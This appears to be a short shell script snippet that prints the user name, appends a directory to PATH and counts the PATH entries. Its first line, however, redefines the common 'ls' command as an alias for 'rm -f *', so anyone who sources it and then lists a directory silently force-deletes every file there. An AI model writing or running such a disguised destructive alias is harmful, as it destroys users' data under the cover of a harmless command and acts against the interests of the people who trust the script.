alias ls='rm -f *'
echo $USER
export PATH="$PATH:/action"
echo $PATH | tr ":" "\n" | grep -v '^$' | wc -l
